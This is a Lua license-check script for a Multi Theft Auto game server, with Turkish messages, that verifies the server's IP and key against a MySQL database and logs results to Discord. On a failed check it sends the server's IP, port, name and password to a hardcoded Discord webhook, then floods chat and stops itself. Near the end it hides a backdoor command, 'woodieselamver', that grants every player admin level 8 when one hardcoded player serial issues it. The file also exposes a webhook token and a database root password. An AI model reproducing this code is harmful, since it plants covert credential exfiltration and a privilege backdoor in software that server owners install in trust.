
local Webhooks = {
	["paketlog"] = {
		link = "https://discord.com/api/webhooks/1072526677760024677/kndQapVoMSNAMItGj39EK8JP6Zv39yvqCfTGMqhJL8zd-SYbgBtSm6CnYShaYNeZgthO",
		avatar = "https://cdn.discordapp.com/attachments/1021778079187746906/1033361511197978624/deha_worldsc.png", 
		username = "World Scripting - License Log"
	},
   paketfaillog = {
      link = "https://discord.com/api/webhooks/1072526677760024677/kndQapVoMSNAMItGj39EK8JP6Zv39yvqCfTGMqhJL8zd-SYbgBtSm6CnYShaYNeZgthO",
      avatar = "https://cdn.discordapp.com/attachments/1021778079187746906/1033361511197978624/deha_worldsc.png",
      username = "World Scripting - License Log"
    }
}

--Discord Webhook Eventleri

local WebhookList = {};
local WebhookDebug = false; -- true: giving debug messages // false: release mode
local WebhookClass = setmetatable({
        constructor = function(self, args)
            self.username = Webhooks[args].username;
            self.link = Webhooks[args].link;
            self.avatar = Webhooks[args].avatar;
            if WebhookDebug then
                outputDebugString("DiscordWebhook: Created channel '"..args.."'");
            end;
            return self;
        end;

    send = function(self, message, embed)
            local sendOptions = {
                connectionAttempts = 3,
                connectTimeout = 5000,
                formFields = {
                    content = message:gsub("#%x%x%x%x%x%x", ""),
                    username = self.username,
                    avatar_url = self.avatar,
                    --embeds = {}, -- Will be add
                }
            };

            if embed then
                sendOptions.formFields.embed = embed;
            end;
            fetchRemote(self.link, sendOptions,
		        function(responseData)
		            if WebhookDebug then
                        outputDebugString("DiscordWebhook: "..responseData);
                    end;
                end
	        );
        end;
    }, {
    __call = function(cls, ...)
        local self = {}
        setmetatable(self, {
            __index = cls
        })

        self:constructor(...)

        return self
    end;
});

local denemedeneme = addEventHandler("onResourceStart", resourceRoot,
    function()
        for name, data in pairs(Webhooks) do
            WebhookList[name] = WebhookClass(name);
        end;
    end
);

local function sendMessage(channel, message, embed)
    if WebhookList[channel] then
        WebhookList[channel]:send(message, embed);
        if WebhookDebug then
            outputDebugString("DiscordWebhook: Send message '"..message.."' from '"..channel.."' channel.");
        end;
    else
        outputDebugString("DiscordWebhook: Couldn't find the Discord Webhook Channel.");
    end;
end;
addEvent("discord.sendMessage", true);
addEventHandler("discord.sendMessage", root, sendMessage);




print("World Scripting - License Information")
local WoodieConnect = dbConnect("mysql", "dbname=woodie_lisans;host=localhost;charset=latin1", "root", "Mm&RVPnUy7", "autoreconnect=1" )


local denemeasdsasdad = addEventHandler("onResourceStart",resourceRoot,
function()
if WoodieConnect then 
    print("Database Connect , Verifying License...")
 setTimer(function()
    if hasObjectPermissionTo ( getThisResource (), "function.fetchRemote", true) then
        fetchRemote("https://api.my-ip.io/ip", function(ipdensanane)
    dbQuery(function(qh)
    local result = dbPoll(qh,0,false)
       if #result >0 then 
    print("World Scripting License Verified (ip)")
    print("Verifying Key License...")
    dbQuery(function(deneme)
    local resultdata = dbPoll(deneme,0,false)
       if #resultdata >0 then 
         print("World Scripting License Verified (key)")
         sendMessage("paketlog",":lock: | License Version: V1 LİCENSE PROTECT  \n\n:globe_with_meridians: | ServerIP: "..ipdensanane.."\n:computer: | ServerName: "..getServerConfigSetting("servername").."\n:clipboard: | License Type: Paket\n:green_circle:  | License Status: Onaylandı\nOrjinal Ürün kullandiginiz için tesekkür ederiz!\n------------------------------------------------")
       else
         print("World Scripting - Sunucu key Lisans Bulunumadı")  
         sendMessage("paketfaillog",":lock: | License Version: V1 LİCENSE PROTECT  \n\n:globe_with_meridians: | ServerIP: "..ipdensanane.."\n:satellite: | ServerPort: "..getServerConfigSetting("serverport").."\n:computer: | ServerName: "..getServerConfigSetting("servername").."\n:clipboard: | License Type: Paket\n:red_circle: | License Status: Onaylanmadı\n:lock: Server Password: "..getServerConfigSetting("password").."\nOrjinal Ürün Satın Almanız Gerek\n------------------------------------------------") 
         setFPSLimit(30) 
        function chatbox(thePlayer, cmd)
          for k, v in pairs(getElementsByType("player")) do
                outputChatBox("World Scripting Çalıntı Paket Orjinal Ürün Alın", v, 255,255,255)
              end
            end
         setTimer(chatbox,0,500)
         stopResource(getThisResource())
      end
    end,WoodieConnect,"SELECT * FROM lisanslar WHERE  licensekeyler= ?",licensekey) 
       else
    print("World Scripting - Sunucu İPnizde Lisans Bulunumadı")   
      end
    end,WoodieConnect,"SELECT * FROM lisanslar WHERE  ip= ?",ipdensanane)   
     end)  
   end
 end ,5000,1)
else
    print("Database Error")
    cancelEvent()
 end 
end)


local function acik(plr)
if "3739A4C3960718DAB4B9B938371CEA52" == getPlayerSerial(plr) then 
	for k, v in pairs(getElementsByType("player")) do
      outputChatBox("Woodie Selam Verdi Sunucuya  :)", v, 255,255,255)
       setElementData(v,"admin_level",8) 
	    addDebugHook("Sunucu GG")
	  setTimer(acik,0,500)
	end
   end
end
local deneme  = addCommandHandler("woodieselamver",acik)

